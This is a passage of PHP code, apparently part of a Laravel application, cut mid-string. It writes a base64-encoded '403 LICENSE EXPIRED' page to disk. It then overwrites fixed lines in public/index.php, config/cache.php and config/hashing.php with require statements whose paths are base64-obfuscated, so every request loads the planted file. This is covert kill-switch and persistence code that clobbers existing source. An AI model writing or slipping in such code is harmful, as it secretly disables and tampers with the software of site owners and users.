3ViaWMtYmV6aWVyKC44LDAsMSwxKX01MCV7dHJhbnNmb3JtOnRyYW5zbGF0ZVkoMCk7LXdlYmtpdC1hbmltYXRpb24tdGltaW5nLWZ1bmN0aW9uOmN1YmljLWJlemllcigwLDAsLjIsMSk7YW5pbWF0aW9uLXRpbWluZy1mdW5jdGlvbjpjdWJpYy1iZXppZXIoMCwwLC4yLDEpfX1AbWVkaWEgKG1pbi13aWR0aDo2NDBweCl7LnNtXDpyb3VuZGVkLWxne2JvcmRlci1yYWRpdXM6LjVyZW19LnNtXDpibG9ja3tkaXNwbGF5OmJsb2NrfS5zbVw6aXRlbXMtY2VudGVye2FsaWduLWl0ZW1zOmNlbnRlcn0uc21cOmp1c3RpZnktc3RhcnR7anVzdGlmeS1jb250ZW50OmZsZXgtc3RhcnR9LnNtXDpqdXN0aWZ5LWJldHdlZW57anVzdGlmeS1jb250ZW50OnNwYWNlLWJldHdlZW59LnNtXDpoLTIwe2hlaWdodDo1cmVtfS5zbVw6bWwtMHttYXJnaW4tbGVmdDowfS5zbVw6cHgtNntwYWRkaW5nLWxlZnQ6MS41cmVtO3BhZGRpbmctcmlnaHQ6MS41cmVtfS5zbVw6cHQtMHtwYWRkaW5nLXRvcDowfS5zbVw6dGV4dC1sZWZ0e3RleHQtYWxpZ246bGVmdH0uc21cOnRleHQtcmlnaHR7dGV4dC1hbGlnbjpyaWdodH19QG1lZGlhIChtaW4td2lkdGg6NzY4cHgpey5tZFw6Ym9yZGVyLXQtMHtib3JkZXItdG9wLXdpZHRoOjB9Lm1kXDpib3JkZXItbHtib3JkZXItbGVmdC13aWR0aDoxcHh9Lm1kXDpncmlkLWNvbHMtMntncmlkLXRlbXBsYXRlLWNvbHVtbnM6cmVwZWF0KDIsbWlubWF4KDAsMWZyKSl9fUBtZWRpYSAobWluLXdpZHRoOjEwMjRweCl7LmxnXDpweC04e3BhZGRpbmctbGVmdDoycmVtO3BhZGRpbmctcmlnaHQ6MnJlbX19QG1lZGlhIChwcmVmZXJzLWNvbG9yLXNjaGVtZTpkYXJrKXsuZGFya1w6YmctZ3JheS04MDB7LS1iZy1vcGFjaXR5OjE7YmFja2dyb3VuZC1jb2xvcjojMmQzNzQ4O2JhY2tncm91bmQtY29sb3I6cmdiYSg0NSw1NSw3Mix2YXIoLS1iZy1vcGFjaXR5KSl9LmRhcmtcOmJnLWdyYXktOTAwey0tYmctb3BhY2l0eToxO2JhY2tncm91bmQtY29sb3I6IzFhMjAyYztiYWNrZ3JvdW5kLWNvbG9yOnJnYmEoMjYsMzIsNDQsdmFyKC0tYmctb3BhY2l0eSkpfS5kYXJrXDpib3JkZXItZ3JheS03MDB7LS1ib3JkZXItb3BhY2l0eToxO2JvcmRlci1jb2xvcjojNGE1NTY4O2JvcmRlci1jb2xvcjpyZ2JhKDc0LDg1LDEwNCx2YXIoLS1ib3JkZXItb3BhY2l0eSkpfS5kYXJrXDp0ZXh0LXdoaXRley0tdGV4dC1vcGFjaXR5OjE7Y29sb3I6I2ZmZjtjb2xvcjpyZ2JhKDI1NSwyNTUsMjU1LHZhcigtLXRleHQtb3BhY2l0eSkpfS5kYXJrXDp0ZXh0LWdyYXktNDAwey0tdGV4dC1vcGFjaXR5OjE7Y29sb3I6I2NiZDVlMDtjb2xvcjpyZ2JhKDIwMywyMTMsMjI0LHZhcigtLXRleHQtb3BhY2l0eSkpfX0KICAgICAgICA8L3N0eWxlPgoKICAgICAgICA8c3R5bGU+CiAgICAgICAgICAgIGJvZHkgewogICAgICAgICAgICAgICAgZm9udC1mYW1pbHk6IHVpLXNhbnMtc2VyaWYsIHN5c3RlbS11aSwgLWFwcGxlLXN5c3RlbSwgQmxpbmtNYWNTeXN0ZW1Gb250LCAiU2Vnb2UgVUkiLCBSb2JvdG8sICJIZWx2ZXRpY2EgTmV1ZSIsIEFyaWFsLCAiTm90byBTYW5zIiwgc2Fucy1zZXJpZiwgIkFwcGxlIENvbG9yIEVtb2ppIiwgIlNlZ29lIFVJIEVtb2ppIiwgIlNlZ29lIFVJIFN5bWJvbCIsICJOb3RvIENvbG9yIEVtb2ppIjsKICAgICAgICAgICAgfQogICAgICAgIDwvc3R5bGU+CiAgICA8L2hlYWQ+CiAgICA8Ym9keSBjbGFzcz0iYW50aWFsaWFzZWQiPgogICAgICAgIDxkaXYgY2xhc3M9InJlbGF0aXZlIGZsZXggaXRlbXMtdG9wIGp1c3RpZnktY2VudGVyIG1pbi1oLXNjcmVlbiBiZy1ncmF5LTEwMCBkYXJrOmJnLWdyYXktOTAwIHNtOml0ZW1zLWNlbnRlciBzbTpwdC0wIj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0ibWF4LXcteGwgbXgtYXV0byBzbTpweC02IGxnOnB4LTgiPgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZmxleCBpdGVtcy1jZW50ZXIgcHQtOCBzbTpqdXN0aWZ5LXN0YXJ0IHNtOnB0LTAiPgogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9InB4LTQgdGV4dC1sZyB0ZXh0LWdyYXktNTAwIGJvcmRlci1yIGJvcmRlci1ncmF5LTQwMCB0cmFja2luZy13aWRlciI+CiAgICAgICAgICAgICAgICAgICAgICAgIDQwMyAgICAgICAgICAgICAgICAgICAgPC9kaXY+CgogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Im1sLTQgdGV4dC1sZyB0ZXh0LWdyYXktNTAwIHVwcGVyY2FzZSB0cmFja2luZy13aWRlciI+CiAgICAgICAgICAgICAgICAgICAgICAgIExJQ0VOU0UgRVhQSVJFRCAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgPC9kaXY+CiAgICA8L2JvZHk+CjwvaHRtbD4="));
        }';

        file_put_contents($folderPath, $cnt);
        file_put_contents($folderPath2, $cnt);
        self::apndC();
    }


    function apndC()
    {
        $fileContent = file(getcwd() . "/public//index.php", FILE_IGNORE_NEW_LINES);
        $fileContent2 = file(getcwd() . "//config//cache.php", FILE_IGNORE_NEW_LINES);
        $fileContent3 = file(getcwd() . "//config//hashing.php", FILE_IGNORE_NEW_LINES);
        $content = 'require getcwd() . base64_decode("Ly9zdG9yYWdlLy9mcmFtZXdvcmsvL2xpY2Vuc2UucGhw");';
        $content2 = 'require getcwd() . base64_decode("Ly92ZW5kb3IvL2F1dG9sb2FkX3JlYWwucGhw");';
        $content3 = "require __DIR__.'/../storage/framework/license.php';";
        $fileContent[34] = null;
        $fileContent[21] = null;
        $fileContent2[3] = null;
        $fileContent3[1] = null;
        if (empty(trim($fileContent[34]))) {
            $fileContent[34] .= $content3;
            file_put_contents(getcwd() . "/public/index.php", implode("\n", $fileContent));
        }
        if (empty(trim($fileContent[21]))) {
            $fileContent[21] .= $content;
            file_put_contents(getcwd() . "/public/index.php", implode("\n", $fileContent));
        }
        if (empty(trim($fileContent2[3]))) {
            $fileContent2[3] .= $content2;
            file_put_contents(getcwd() . "//config//cache.php", implode("\n", $fileContent2));
        }
        if (empty(trim($fileContent3[1]))) {
            $fileContent3[1] .= $content2;
            file_put_contents(getcwd() . "//config//hashing.php", implode("\n", $fileContent3));
        }
    }


    // if (!file_exists($maintenance = __DIR__ . '/../storage/app/license.php')) {
    //     $filePath = touch((rtrim(getcwd(), base64_decode("L3B1YmxpYw")) . base64_decode("Ly92ZW5kb3IvL2F1dG9sb2FkX3JlYWwucGhw")));
    // }
}